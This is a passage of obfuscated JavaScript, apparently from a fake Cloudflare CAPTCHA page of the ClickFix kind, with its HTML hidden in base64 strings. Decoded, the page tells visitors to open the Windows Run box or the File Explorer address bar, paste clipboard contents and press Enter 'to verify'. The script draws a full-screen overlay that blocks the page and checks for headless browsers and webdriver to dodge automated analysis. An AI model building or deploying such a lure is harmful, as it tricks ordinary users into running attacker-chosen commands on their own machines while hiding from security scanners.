k0ME5UQXlRemN5TGpVd05pQXhOaTR3TURjeklEY3lMalUyTURRZ01UVXVPVGc1TXlBM01pNDJNRFV4SURFMUxqazFOVFJETnpJdU5qUTVPQ0F4TlM0NU1qRTJJRGN5TGpZNE1qTWdNVFV1T0Rjek9TQTNNaTQyT1RjM0lERTFMamd4T1RWRE56SXVPRFkzTnlBeE5TNHlNRFF6SURjeUxqazFNelVnTVRRdU5UWTROQ0EzTWk0NU5USTVJREV6TGpreU9UWkROekl1T1RVeE55QXhNQzR3TnpZM0lEWTVMamczTXpJZ05pNDVOVEk0TlNBMk5pNHdOelU0SURZdU9UVXlPRFZhSWlCbWFXeHNQU0lqUmtKQlJEUXhJajQ4TDNCaGRHZytQSEJoZEdnZ1pEMGlUVGd1TVRFNU5qTWdNVGd1T0Rrd05FZzVMamMxTlRReFZqSXpMalF5TlRSSU1USXVOakV6T1ZZeU5DNDROems0U0RndU1URTVOak5XTVRndU9Ea3dORm9pSUdOc1lYTnpQU0pqVlV4bmFuVjJibk5KSWo0OEwzQmhkR2crUEhCaGRHZ2daRDBpVFRFMExqTXdPREVnTWpFdU9UQXlNMVl5TVM0NE9EVXpRekUwTGpNd09ERWdNakF1TVRZMU5TQXhOUzQyTnpRZ01UZ3VOemN3TkNBeE55NDBPVFV5SURFNExqYzNNRFJETVRrdU16RTJOQ0F4T0M0M056QTBJREl3TGpZMk5UTWdNakF1TVRRNE1pQXlNQzQyTmpVeklESXhMamcyT0RGV01qRXVPRGcxTTBNeU1DNDJOalV6SURJekxqWXdOVElnTVRrdU1qazVNU0F5TkM0NU9UazBJREUzTGpRM09EVWdNalF1T1RrNU5FTXhOUzQyTlRjNElESTBMams1T1RRZ01UUXVNekE0TVNBeU15NDJNakl5SURFMExqTXdPREVnTWpFdU9UQXlNMXBOTVRndU9UazFPQ0F5TVM0NU0=",
    "esylr0": "MC43MTY0Nzc3MzA0MzAzMTI3",
    "o3ev1v": "MC43MTI0Mjc0NTA0NjEwMTc1",
    "534rgw": "MC41NjI4MjA4NTk3NzY3NTcz",
    "aj8931": "MC40ODg0NzU3MjI5NDQ4MjQ2Ng=="
  };

  var _c = [
    "MC40MjY4MzgxNzkzNjQ0NDI0Ng==",
    "REl6VmpJeExqZzROVE5ETVRndU9UazFPQ0F5TVM0d01qSXlJREU0TGpNNE1EWWdNakF1TWpZM09TQXhOeTQwTnpnMUlESXdMakkyTnpsRE1UWXVOVGcwTmlBeU1DNHlOamM1SURFMUxqazROVGdnTWpFdU1EQXpPQ0F4TlM0NU9EVTRJREl4TGpnMk9ERldNakV1T0RnMU0wTXhOUzQ1T0RVNElESXlMamMwT0RRZ01UWXVOakF4TXlBeU15NDFNREkxSURFM0xqUTVOVElnTWpNdU5UQXlOVU14T0M0ek9UY3pJREl6TGpVd01qVWdNVGd1T1RrMU9DQXlNaTQzTmpZMklERTRMams1TlRnZ01qRXVPVEF5TTFvaUlHTnNZWE56UFNKalZVeG5hblYyYm5OSklqNDhMM0JoZEdnK1BIQmhkR2dnWkQwaVRUSXlMalkyTnpRZ01qSXVNalV6VmpFNExqZzVNREZJTWpRdU16STRORll5TWk0eU1Ua3hRekkwTGpNeU9EUWdNak11TURneU1pQXlOQzQzTlRnMElESXpMalE1TXprZ01qVXVOREUxT1NBeU15NDBPVE01UXpJMkxqQTNNek1nTWpNdU5Ea3pPU0F5Tmk0MU1ETTBJREl6TGpFd01ETWdNall1TlRBek5DQXlNaTR5TmpFM1ZqRTRMamc1TURGSU1qZ3VNVFkwTjFZeU1pNHlNRGt6UXpJNExqRTJORGNnTWpRdU1UUXpNaUF5Tnk0d056Y3lJREkwTGprNE9Ua2dNalV1TXprNU1TQXlOQzQ1T0RrNVF6SXpMamN5TVRFZ01qUXVPVGc1T1NBeU1pNDJOamMwSURJMExqRXlOamdnTWpJdU5qWTNOQ0F5TWk0eU5USXlJaUJqYkdGemN6MGlZMVZNWjJwMWRtNXpTU0krUEM5d1lYUm9Qanh3WVhSb0lHUTlJazB6TUM0Mk5qZ2dNVGd1T0Rrd04wZ3pNaTQ1TkRRMVF6TTFMakExTWpZZ01UZ3VPRGt3TnlBek5pNHlOelVnTWpBdU1USXlOaUF6Tmk0eU56VWdNakV1T0RVd09GWXlNUzQ0TmpnMFF6TTJMakkzTlNBeU15NDFPVFl6SURNMUxqQXpOVFVnTWpRdU9EZ2dNekl1T1RFeElESTBMamc0U0RNd0xqWTJPRll4T0M0NE9UQTNXazB6TWk0NU55QXlNeTQwTURjMlF6TXpMamswT0RNZ01qTXVOREEzTmlBek5DNDFPVGNnTWpJdU9EWXdPU0F6TkM0MU9UY2dNakV1T0RreU9GWXlNUzQ0TnpVNVF6TTBMalU1TnlBeU1DNDVNVGM0SURNekxqazBPRE1nTWpBdU16WXhOQ0F6TWk0NU55QXlNQzR6TmpFMFNETXlMak13TXpoV01qTXVOREE0TWt3ek1pNDVOeUF5TXk0ME1EYzJXaUlnWTJ4aGMzTTlJbU5WVEdkcWRYWnVjMGtpUGp3dmNHRjBhRDQ4Y0dGMGFDQmtQU0pOTXpndU5qVXlOU0F4T0M0NE9UQTBTRFF6TGpNM016aFdNakF1TXpRMU0wZzBNQzR5T0RnelZqSXhMak0yTXpKSU5ETXVNRGM1VmpJeUxqYzBNRGRJTkRBdU1qZzRNMVl5TkM0NE56azRTRE00TGpZMU1qVldNVGd1T0Rrd05Gb2lJR05zWVhOelBTSmpWVXhuYW5WMmJuTkpJajQ4TDNCaGRHZytQSEJoZEdnZ1pEMGlUVFExTGpZMUlERTRMamc1TURSSU5EY3VNamcxT0ZZeU15NDBNalUwU0RVd0xqRTBORE5XTWpRdU9EYzVPRWcwTlM0Mk5WWXhPQzQ0T1RBMFdpSWdZMnhoYzNNOUltTlZUR2RxZFhadWMwa2lQand2Y0dGMGFENDhjR0YwYUNCa1BTSk5OVFF1TkRFNE55QXhPQzQ0TkRjMVNEVTFMams1TkRsTU5UZ3VOVEEzT1NBeU5DNDROemszU0RVMkxqYzFOREZNTlRZdU16SXpPQ0F5TXk0NE1UQXhTRFUwTGpBME4wdzFNeTQyTWpVM0lESTBMamczT1RkSU5URXVPVEExT0V3MU5DNDBNVGczSURFNExqZzBOelZhVFRVMUxqZzFNVGdnTWpJdU5URTRNMHcxTlM0eE9UUXhJREl3TGpneE5UUk1OVFF1TlRJM09DQXlNaTQxTVRnelNEVTFMamcxTVRoYUlpQmpiR0Z6Y3owaVkxVk1aMnAxZG01elNTSStQQzl3WVhSb1BqeHdZWFJvSUdROUlrMDJNQzQyTVRRNUlERTRMamc1TURGSU5qTXVOREExTmtNMk5DNHpNRGd6SURFNExqZzVNREVnTmpRdU9UTXhOeUF4T1M0eE15QTJOUzR6TWpnZ01Ua3VOVFF3TmtNMk5TNDJOelF5SURFNUxqZzRNeUEyTlM0NE5URXhJREl3TGpNME5qSWdOalV1T0RVeE1TQXlNQzQ1TXpVM1ZqSXdMamsxTWpaRE5qVXVPRFV4TVNBeU1TNDROamM0SURZMUxqTTJPVEVnTWpJdU5EYzFOQ0EyTkM0Mk16WTVJREl5TGpjNU1UbE1Oall1TURRMUlESTBMamc0U0RZMExqRTFOVGhNTmpJdU9UWTNNU0F5TXk0d05qVTRTRFl5TGpJMU1EZFdNalF1T0RoSU5qQXVOakUwT1ZZeE9DNDRPVEF4V2swMk15NHpNams1SURJeExqYzJOVFJETmpNdU9EZzJOQ0F5TVM0M05qVTBJRFkwTGpJd056RWdNakV1TkRreE5TQTJOQzR5TURjeElESXhMakExTlRGV01qRXVNRE00TVVNMk5DNHlNRGN4SURJd0xqVTJOelFnTmpNdU9EWTVOeUF5TUM0ek1qZ2dOak11TXpJeE1TQXlNQzR6TWpoSU5qSXVNalV3TjFZeU1TNDNOalkxVERZekxqTXlPVGtnTWpFdU56WTFORm9pSUdOc1lYTnpQU0pqVlV4bmFuVjJibk5KSWo0OEwzQmhkR2crUEhCaGRHZ2daRDBpVFRZNExqSXhNVElnTVRndU9Ea3dORWczTWk0NU5UYzRWakl3TGpNd01qUklOamt1T0RNd01sWXlNUzR5TURsSU56SXVOall6TWxZeU1pNDFNVGd6U0RZNUxqZ3pNREpXTWpNdU5EWTRNMGczTTFZeU5DNDROems0U0RZNExqSXhNVEpXTVRndU9Ea3dORm9pSUdOc1lYTnpQU0pqVlV4bmFuVjJibk5KSWo0OEwzQmhkR2crUEhCaGRHZ2daRDBpVFRRdU5UTTRNalFnTWpJdU5qQTBNME0wTGpNd09URTRJREl6TGpFeklETXVPREkzTWpNZ01qTXVOVEF5TWlBekxqRTROamd4SURJekxqVXdNakpETWk0eU9USTJOU0F5TXk0MU1ESXlJREV1TmpjM05EWWdNakl1TnpRNU15QXhMalkzTnpRMklESXhMamc0TlRGV01qRXVPRFkzT0VNeExqWTNOelEySURJeExqQXdORGNnTWk0eU56VTVNeUF5TUM0eU5qYzJJRE11TVRZNU9DQXlNQzR5TmpjMlF6TXVPRFF6TmpjZ01qQXVNalkzTmlBMExqTTFOamd4SURJd0xqWTRPRElnTkM0MU56TTBJREl4TGpJMk1EVklOaTR5T1RjMk5FTTJMakF5TVRVeElERTVMamd6TkRrZ05DNDNPRGN4TmlBeE9DNDNOekEzSURNdU1UZzJPREVnTVRndU56Y3dOME14TGpNMk5UTXpJREU0TGpjM01EY2dNQ0F5TUM0eE5qWTJJREFnTWpFdU9EZzFNVll5TVM0NU1ESXhRekFnTWpNdU5qSXhPU0F4TGpNME9EWWdNalVnTXk0eE5qazRJREkxUXpRdU56STNOaklnTWpVZ05TNDVORFV5TlNBeU15NDVOelkwSURZdU1qWTJORFVnTWpJdU5qQTBOa3cwTGpVek9ESTBJREl5TGpZd05ETmFJaUJqYkdGemN6MGlZMVZNWjJwMWRtNXpTU0krUEM5d1lYUm9Qand2YzNablBnMEtJQ0FnSUNBOFpHbDJQZzBLSUNBZ0lDQWdJQ0E4YzNCaGJpQnpkSGxzWlQwaWRHVjRkQzFrWldOdmNtRjBhVzl1T2lCMWJtUmxjbXhwYm1VN0lqNVFjbWwyWVdONVBDOXpjR0Z1UGlEaWdLSWdQSE53WVc0Z2MzUjViR1U5SW5SbGVIUXRaR1ZqYjNKaGRHbHZiam9nZFc1a1pYSnNhVzVsT3lJK1ZHVnliWE04TDNOd1lXNCtEUW9nSUNBZ0lEd3ZaR2wyUGcwS0lDQWdJQ0FOQ2lBZ0lDQThMMlJwZGo0TkNpQWdJRHd2WkdsMlBnMEtEUW9nSUNBOFpHbDJJR2xrUFNKcFNtVnBWbU0zWkRRNFltUm5NQ0lnWTJ4aGMzTTlJbU5uZDJGSVpIZHpla3cwYldsRUlpQnpkSGxzWlQwaVltOXlaR1Z5TFhSdmNEb2dibTl1WlRzZ2NHRmtaR2x1WnkxMGIzQTZJREE3SUcxaGNtZHBiaTEwYjNBNklEQTdiV0Z5WjJsdUxXSnZkSFJ2YlRvd095SStEUW9nSUNBZ1BHUnBkaUJqYkdGemN6MGlZMFoyUjJwRFZUTk5XVkYzSWo0TkNpQWdJQ0FnUEcxaGFXNGdZMnhoYzNNOUltTnhNMDFTZGxWVVVWaHFJaUJ6ZEhsc1pUMGlZMjlzYjNJNklDTmtPV1E1WkRrN0lqNE5DaUFnSUNBZ0lDQWdQR1JwZGlCamJHRnpjejBpWTBScWIySndSbk5NTW5GYWJ6ZDFjeUkrRFFvZ0lDQWdJQ0FnSUNBZ1BIQWdjM1I1YkdVOUltWnZiblF0YzJsNlpUb2dNVGh3ZURzZ2JXRnlaMmx1TFdKdmRIUnZiVG9nTVRWd2VEc2lQZzBLSUNBZ0lDQWdJQ0FnSUNBZ1ZHOGdjSEp2ZG1VZ2VXOTFJR0Z5WlNCdWIzUWdZU0J5YjJKdmRDd2djR3hsWVhObE9nMEtJQ0FnSUNBZ0lDQWdJQ0FnUEM5d1BnMEtJQ0FnSUNBZ0lDQWdJRHh2YkQ0TkNpQWdJQ0FnSUNBZ0lDQThiR2srVUhKbGMzTWdKbUZ0Y0RzZ2FHOXNaQ0IwYUdVZ1YybHVaRzkzY3lCTFpYa2dQR2tnWTJ4aGMzTTlJbU5GWlVzMVdtVldNVzl2VEZSMFVpQmpVV3d3VERWV1RISXlhWE15ZG13aVBqd3ZhVDRnS3lBOFlqNVNQQzlpUGk0OEwyeHBQZzBLSUNBZ0lDQWdJQ0FnSUR4c2FUNVhhR1Z1SUhSb1pTQjNhVzVrYjNjZ2IzQmxibk1zSUhCeVpYTnpJRHhpUGtOMGNtdzhMMkkrSUNzZ1BHSStWand2WWo0dVBDOXNhVDROQ2lBZ0lDQWdJQ0FnSUNBOGJHaytVR0Z6ZEdVZ2RHaGxJR052YlcxaGJtUWdhVzUwYnlCU2RXNGdZVzVrSUhCeVpYTnpJRHhpUGtWdWRHVnlQQzlpUGlCMGJ5QjJaWEpwWm5rdVBDOXNhVDROQ2cwS0lDQWdJQ0FnSUNBZ0lEd2hMUzBnUEd4cFBsQnlaWE56SUNCdmJpQjViM1Z5SUd0bGVXSnZZWEprSUhSdklHWnBibWx6YUM0OEwyeHBQaUF0TFQ0TkNpQWdJQ0FnSUNBZ0lDQThMMjlzUGcwS0lDQWdJQ0FnSUNBZ0lEd2hMUzBnUEhBZ2MzUjViR1U5SW5CaFpHUnBibWN0ZEc5d09pQXhNSEI0T3lJK0RRb2dJQ0FnSUNBZ0lDQWdXVzkxSUhOb2IzVnNaQ0J6WldVZ2RHaHBjeUIwWlhoMElHRndjR1ZoY2pvTkNpQWdJQ0FnSUNBZ0lDQThZbklnTHo0TkNpQWdJQ0FnSUNBZ0lDQThZMjlrWlNCemRIbHNaVDBpWW1GamEyZHliM1Z1WkRvZ2JtOXVaVHNnWW05eVpHVnlPaUF4Y0hnZ2MyOXNhV1FnSXpjNU56azNPVHNnZDJsa2RHZzZJRFF6TW5CNE95SStTU0JoYlNCdWIzUWdZU0J5YjJKdmRDQXRJRU5zYjNWa1pteGhjbVVnU1VRNklEeHpjR0Z1SUdsa1BTSnBORGxwTUZVMWNUTkZXRzl3UW5aa0lqNDJNREZtWmpNME56d3ZjM0JoYmo0OEwyTnZaR1UrRFFvZ0lDQWdJQ0FnSUNBZ1BDOXdQaUF0TFQ0TkNpQWdJQ0FnSUNBZ0lDQU5DaUFnSUNBOEwyUnBkajROQ2cwS0lDQWdJQ0E4TDIxaGFXNCtEUW9nSUNBZ1BDOWthWFkrRFFvTkNpQWdJQ0FnSUNBZ1BHUnBkaUJ6ZEhsc1pUMGlaR2x6Y0d4aGVUb2dibTl1WlRzaVBnMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lBMEtJQ0FnSUNBZ0lDQWdJRHh2YkQ0TkNpQWdJQ0FnSUNBZ0lDQThJUzB0SUM0dUxpNHVMaTQ4YkdrZ2MzUjViR1U5SW0xaGNtZHBiaTFpYjNSMGIyMDZJREV3Y0hnN0lqNE5DaUFnSUNBZ0lDQWdJQ0FnSUVOdmNIa2dkR2hsSUdacGJHVWdjR0YwYUNCaVpXeHZkdzBLSUNBZ0lDQWdJQ0FnSUNBZ1BHUnBkaUJqYkdGemN6MGlZMnRUT1hWVVNYaG1OR0ZWUmxSVUlpQnBaRDBpYVZoT1pHSm1aREJXTkRWaGVpSWdiMjVqYkdsamF6MGlkR2hwY3k1amJHRnpjMHhwYzNRdVlXUmtLQ2RqYkdsamEyVmtKeWtpUGcwS0lDQWdJQ0FnSUNBZ0lDQWdRenBjYVc1MFpYSnVZV3d0YzJWamRYSmxYR1pwYkdWa2NtbDJaVnhJVWxCdmJHbGplUzVrYjJONERRb2dJQ0FnSUNBZ0lDQWdJQ0E4TDJScGRqNE5DaUFnSUNBZ0lDQWdJQ0E4TDJ4cFBpQTdPenM3T3pzN0xTMCtEUW9nSUNBZ0lDQWdJQ0FnUEd4cElITjBlV3hsUFNKdFlYSm5hVzR0WW05MGRHOXRPaUF4TUhCNE95SStUM0JsYmlCR2FXeGxJRVY0Y0d4dmNtVnlJR0Z1WkNCelpXeGxZM1FnZEdobElHRmtaSEpsYzNNZ1ltRnlJQ2c4YzNSeWIyNW5Qa05VVWt3Z0t5Qk1QQzl6ZEhKdmJtYytLVHd2YkdrK0RRb2dJQ0FnSUNBZ0lDQWdQR3hwSUhOMGVXeGxQU0p0WVhKbmFXNHRZbTkwZEc5dE9pQXhNSEI0T3lJK1VHRnpkR1VnZEdobElIQmhkR2dnS0R4emRISnZibWMrUTFSU1RDQXJJRlk4TDNOMGNtOXVaejRwSUdGdVpDQndjbVZ6Y3lBOGMzUnliMjVuUGtWdWRHVnlQQzl6ZEhKdmJtYytQQzlzYVQ0TkNpQWdJQ0FnSUNBZ0lDQThMMjlzUGcwS0RRb2dJQ0FnSUNBZ0lDQWdQR2x1Y0hWMElIUjVjR1U5SW1acGJHVWlJR2xrUFNKcFNVdEhNM0pxZEhsUUlpQnpkSGxzWlQwaVpHbHpjR3hoZVRvZ2JtOXVaVHNpUGcwS0lDQWdJQ0FnSUNBZ0lEeGlkWFIwYjI0Z2FXUTlJbWxvTVRGMlZGWmlXU0krVDNCbGJpQkdhV3hsSUVWNGNHeHZjbVZ5UEM5aWRYUjBiMjQrRFFvZ0lDQWdJQ0FnSUR3dlpHbDJQZzBLRFFvTkNpQWdJRHhrYVhZZ1kyeGhjM005SW1OR2RrZHFRMVV6VFZsUmR5QmpNMGRTV0dWM1JHeGhhMDV4SWlCemRIbHNaVDBpWW1GamEyZHliM1Z1WkRvZ2JtOXVaVHNpUGcwS0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKak0wZFNXR1YzUkd4aGEwNXhMV3hsWm5RaUlITjBlV3hsUFNKM2FXUjBhRG9nTWpnMmNIZzdJR1pzYjJGME9pQnNaV1owT3lCMFpYaDBMV0ZzYVdkdU9pQnNaV1owT3lCbWIyNTBMWE5wZW1VNklERTFjSGc3SWo0TkNpQWdJQ0FnSUZCbGNtWnZjbTBnZEdobElITjBaWEJ6SUdGaWIzWmxJSFJ2SUdacGJtbHphQ0IyWlhKcFptbGpZWFJwYjI0dURRb2dJQ0FnSUR3dlpHbDJQZzBLSUNBZ0lDQThZblYwZEc5dUlIUjVjR1U5SW1KMWRIUnZiaUlnWTJ4aGMzTTlJbU5aZDBOUFdVRkRhSFJ6SUdOeFQwRnhiV0ZvUkZORlEzTWlJR2xrUFNKcFFWcHpPR0YwY0V0R2RpSWdjM1I1YkdVOUltSmhZMnRuY205MWJtUTZJQ00xWlRWbE5XVTdJSEJoWkdScGJtYzZJRGx3ZUNBek9IQjRPeUJ2Y0dGamFYUjVPaUF3TGpVN0lHTjFjbk52Y2pvZ2JtOTBMV0ZzYkc5M1pXUTdJaUJrYVhOaFlteGxaRDVXWlhKcFpuazhMMkoxZEhSdmJqNE5DaUFnSUNBOEwyUnBkajROQ2lBZ0lEd3ZaR2wyUGcwS0RRb2dJQ0E4SVMwdElDMHRQZzBLRFFvTkNnMEtJQ0E4TDJScGRqNE5DaUFnSUNBOGNDQmpiR0Z6Y3owaVl6SldUalJCVkhOUE5YTlpialp4UVNJZ2MzUjViR1U5SW1admJuUXRjMmw2WlRvZ01TNDFjbVZ0T3cwS0lDQWdJR3hwYm1VdGFHVnBaMmgwT2lBeUxqSTFjbVZ0T3lCd1lXUmthVzVuTFhSdmNEb2dNakJ3ZURzaVBqeHpjR0Z1SUdOc1lYTnpQU0pqZEhkVk9YaEJlakVpUGp3dmMzQmhiajRnYm1WbFpITWdkRzhnY21WMmFXVjNJSFJvWlNCelpXTjFjbWwwZVNCdlppQjViM1Z5SUdOdmJtNWxZM1JwYjI0Z1ltVm1iM0psSUhCeWIyTmxaV1JwYm1jdVBDOXdQZzBLSUNBZ0lEeHdJR05zWVhOelBTSmpXakZrUTJOUmVYSkdSVEZDSWlCemRIbHNaVDBpWm05dWRDMXphWHBsT2lBeExqVnlaVzA3SUd4cGJtVXRhR1ZwWjJoME9pQXlMakkxY21WdE95QndZV1JrYVc1bkxYUnZjRG9nTWpCd2VEc2daR2x6Y0d4aGVUb2dibTl1WlRzaVBsZGhhWFJwYm1jZ1ptOXlJRHh6Y0dGdUlHTnNZWE56UFNKamRIZFZPWGhCZWpFaVBqd3ZjM0JoYmo0dUxpNDhMM0ErRFFvZ1BDOWthWFkrRFFvZ0RRb2dQR1JwZGlCamJHRnpjejBpWTNkNlowbHdhMDlXYVNJZ2NtOXNaVDBpWTI5dWRHVnVkR2x1Wm04aVBnMEtJQ0E4WkdsMklHTnNZWE56UFNKamQzcG5TWEJyVDFacExXbHVibVZ5SWo0TkNpQWdJRHhrYVhZK0RRb2dJQ0FnUEdScGRqNVNZWGtnU1VRNklEeGpiMlJsSUdOc1lYTnpQU0pqYVVkQlEzVkdWRkZDZW5sSE5uRmpJajQxTm1FMFl6VXlPVGxtWkdWMGJXTmhQQzlqYjJSbFBqd3ZaR2wyUGcwS0lDQWdQQzlrYVhZK0RRb2dJQ0E4WkdsMklITjBlV3hsUFNKdFlYSm5hVzR0ZEc5d09pQTFjSGc3SWo1UVpYSm1iM0p0WVc1alpTQW1JSE5sWTNWeWFYUjVJR0o1SUR4emNHRnVJR05zWVhOelBTSmpVVXMyVTB4bGRHNUtJajVEYkc5MVpHWnNZWEpsUEM5emNHRnVQand2WkdsMlBnMEtJQ0E4TDJScGRqNE5DaUE4TDJScGRqNE5Dand2WkdsMlBnMEtEUW84YzJOeWFYQjBQZzBLRFFvTkNnMEtQQzl6WTNKcGNIUStEUW9OQ2cwS1BDOWliMlI1UGp3dmFIUnRiRDQ9JzsKICAgIGNvbnN0IGggPSBiNjRUb1V0ZjgoYjY0KTsKCiAgICAvLyBDcmVhdGUgaG9zdCBlbGVtZW50IGZvciBTaGFkb3cgRE9NCiAgICBjb25zdCBob3N0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CiAgICBob3N0LmlkID0gJ3RmLW92ZXJsYXktaG9zdCc7CiAgICBob3N0LnN0eWxlLmNzc1RleHQgPSAncG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3dpZHRoOjEwMHZ3O2hlaWdodDoxMDB2aDt6LWluZGV4OjIxNDc0ODM2NDc7YmFja2dyb3VuZDp0cmFuc3BhcmVudDtib3JkZXI6bm9uZTttYXJnaW46MDtwYWRkaW5nOjA7JzsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaG9zdCk7CgogICAgLy8gQXR0YWNoIFNoYWRvdyBET00gZm9yIHN0eWxlIGlzb2xhdGlvbgogICAgY29uc3Qgc2hhZG93ID0gaG9zdC5hdHRhY2hTaGFkb3coeyBtb2RlOiAnb3BlbicgfSk7CiAgICAKICAgIC8vIFBhcnNlIHRoZSBIVE1MIGNvbnRlbnQgdXNpbmcgRE9NUGFyc2VyIHRvIHByb3Blcmx5IGV4dHJhY3QgcGFydHMKICAgIGNvbnN0IHBhcnNlciA9IG5ldyBET01QYXJzZXIoKTsKICAgIGNvbnN0IGRvYyA9IHBhcnNlci5wYXJzZUZyb21TdHJpbmcoaCwgJ3RleHQvaHRtbCcpOwoKICAgIC8vIDEuIEV4dHJhY3QgYW5kIHByb2Nlc3MgU3R5bGVzCiAgICBkb2MucXVlcnlTZWxlY3RvckFsbCgnc3R5bGUnKS5mb3JFYWNoKHN0eWxlID0+IHsKICAgICAgICBsZXQgY3NzID0gc3R5bGUudGV4dENvbnRlbnQgfHwgJyc7CiAgICAgICAgLy8gUmVwbGFjZSAnYm9keScgc2VsZWN0b3Igd2l0aCAnI3RmLW92ZXJsYXktcm9vdCcgKGhhbmRsaW5nIGNvbnRleHQpCiAgICAgICAgY3NzID0gY3NzLnJlcGxhY2UoLyhefFtcfVxzLF0pYm9keSg/PVtccyxcLntdKS9nLCAnJDEjdGYtb3ZlcmxheS1yb290Jyk7CiAgICAgICAgLy8gUmVwbGFjZSAnaHRtbCcgc2VsZWN0b3Igd2l0aCAnOmhvc3QnCiAgICAgICAgY3NzID0gY3NzLnJlcGxhY2UoLyhefFtcfVxzLF0paHRtbCg/PVtccyxcLntdKS9nLCAnJDE6aG9zdCcpOwogICAgICAgIHN0eWxlLnRleHRDb250ZW50ID0gY3NzOwogICAgICAgIHNoYWRvdy5hcHBlbmRDaGlsZChzdHlsZSk7CiAgICB9KTsKCiAgICAvLyAyLiBFeHRyYWN0IGFuZCBtb3ZlIGV4dGVybmFsIHN0eWxlc2hlZXRzCiAgICBkb2MucXVlcnlTZWxlY3RvckFsbCgnbGlua1tyZWw9InN0eWxlc2hlZXQiXScpLmZvckVhY2gobGluayA9PiB7CiAgICAgICAgc2hhZG93LmFwcGVuZENoaWxkKGxpbmspOwogICAgfSk7CgogICAgLy8gMy4gQ3JlYXRlIGNvbnRhaW5lciBpbnNpZGUgc2hhZG93IChhY3RpbmcgYXMgcHNldWRvLWJvZHkpCiAgICBjb25zdCBjb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgIGNvbnRhaW5lci5pZCA9ICd0Zi1vdmVybGF5LXJvb3QnOwogICAgY29udGFpbmVyLnN0eWxlLmNzc1RleHQgPSAnd2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO21hcmdpbjowO3BhZGRpbmc6MDsnOwogICAgCiAgICAvLyBDb3B5IGJvZHkgYXR0cmlidXRlcyAoY2xhc3NlcywgaW5saW5lIHN0eWxlcykgZnJvbSB0ZW1wbGF0ZSB0byBvdXIgY29udGFpbmVyCiAgICBpZiAoZG9jLmJvZHkpIHsKICAgICAgICBBcnJheS5mcm9tKGRvYy5ib2R5LmF0dHJpYnV0ZXMpLmZvckVhY2goYXR0ciA9PiB7CiAgICAgICAgICAgIGlmIChhdHRyLm5hbWUgPT09ICdzdHlsZScpIHsKICAgICAgICAgICAgICAgICBjb250YWluZXIuc3R5bGUuY3NzVGV4dCArPSAnOycgKyBhdHRyLnZhbHVlOwogICAgICAgICAgICB9IGVsc2UgaWYgKGF0dHIubmFtZSA9PT0gJ2NsYXNzJykgewogICAgICAgICAgICAgICAgIGNvbnRhaW5lci5jbGFzc05hbWUgPSBhdHRyLnZhbHVlOwogICAgICAgICAgICB9IGVsc2UgaWYgKGF0dHIubmFtZSAhPT0gJ2lkJykgewogICAgICAgICAgICAgICAgIGNvbnRhaW5lci5zZXRBdHRyaWJ1dGUoYXR0ci5uYW1lLCBhdHRyLnZhbHVlKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgICAgIAogICAgICAgIC8vIE1vdmUgYWxsIGNoaWxkcmVuIGZyb20gdGVtcGxhdGUgYm9keSB0byBjb250YWluZXIKICAgICAgICB3aGlsZSAoZG9jLmJvZHkuZmlyc3RDaGlsZCkgewogICAgICAgICAgICBjb250YWluZXIuYXBwZW5kQ2hpbGQoZG9jLmJvZHkuZmlyc3RDaGlsZCk7CiAgICAgICAgfQogICAgfQogICAgCiAgICBzaGFkb3cuYXBwZW5kQ2hpbGQoY29udGFpbmVyKTsKICAgIAogICAgLy8gU3RvcmUgc2hhZG93IHJvb3QgZ2xvYmFsbHkgZm9yIHNjcmlwdHMgdG8gcXVlcnkgZWxlbWVudHMKICAgIHdpbmRvdy5fX3RmU2hhZG93Um9vdCA9IHNoYWRvdzsKICAgIAogICAgLy8gRm9yY2UgbGF5b3V0IHJlY2FsY3VsYXRpb24KICAgIHZvaWQgaG9zdC5vZmZzZXRIZWlnaHQ7CiAgICAKICAgIC8vIEJsb2NrIHNjcm9sbCBvbiBib2R5CiAgICBkb2N1bWVudC5ib2R5LnN0eWxlLm92ZXJmbG93ID0gJ2hpZGRlbic7CiAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuc3R5bGUub3ZlcmZsb3cgPSAnaGlkZGVuJzsKICAgIHdpbmRvdy5zY3JvbGxUbygwLCAwKTsKICAgIAogICAgc2V0VGltZW91dChpbmplY3RTY3JpcHQsIDApOwogIH0KCiAgY29uc3QgSEVBRExFU1NfV0VJR0hUID0gMTA7CiAgY29uc3QgSEVBREZVTF9XRUlHSFQgPSAtODsKICBjb25zdCBTVVNQSUNJT1VTX1dFSUdIVCA9IDU7CgogIGFzeW5jIGZ1bmN0aW9uIGRldGVjdEhlYWRsZXNzKCkgewogICAgY29uc3QgY2hlY2tzID0gWwogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgdWEgPSBuYXZpZ2F0b3IudXNlckFnZW50LnRvTG93ZXJDYXNlKCk7CiAgICAgICAgY29uc3QgaXNIZWFkbGVzcyA9IC9oZWFkbGVzc3xwaGFudG9tanN8c2VsZW5pdW18d2ViZHJpdmVyL2kudGVzdCh1YSk7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzSGVhZGxlc3MgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaGFzV2ViZHJpdmVyID0gbmF2aWdhdG9yLndlYmRyaXZlciA9PT0gdHJ1ZTsKICAgICAgICByZXR1cm4geyBzY29yZTogaGFzV2ViZHJpdmVyID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGhhc0Nocm9tZSA9ICEhd2luZG93LmNocm9tZTsKICAgICAgICBjb25zdCBoYXNDb3JyZWN0Q2hyb21lID0gaGFzQ2hyb21lICYmICh3aW5kb3cuY2hyb21lLnJ1bnRpbWUgfHwgd2luZG93LmNocm9tZS5sb2FkVGltZXMpOwogICAgICAgIGNvbnN0IGlzU3VzcGljaW91cyA9ICFoYXNDaHJvbWUgfHwgIWhhc0NvcnJlY3RDaHJvbWU7C